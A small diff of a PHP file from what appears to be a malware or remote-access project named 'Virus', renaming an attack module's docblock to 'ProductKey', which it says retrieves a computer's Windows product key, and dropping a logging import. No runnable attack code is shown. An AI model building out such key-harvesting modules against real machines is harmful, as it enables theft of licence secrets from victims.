@@ -4,10 +4,9 @@ namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime\ProductKey;
 
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScript\Windows;
-use Kelvinho\Virus\Singleton\Logs;
 
 /**
- * Class ScanPartitions. Scans to see what drives (aka partitions) does the computer has.
+ * Class ProductKey. Gets the current product key of the computer
  *
  * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
  * @author Quang Ho <157239q@gmail.com>
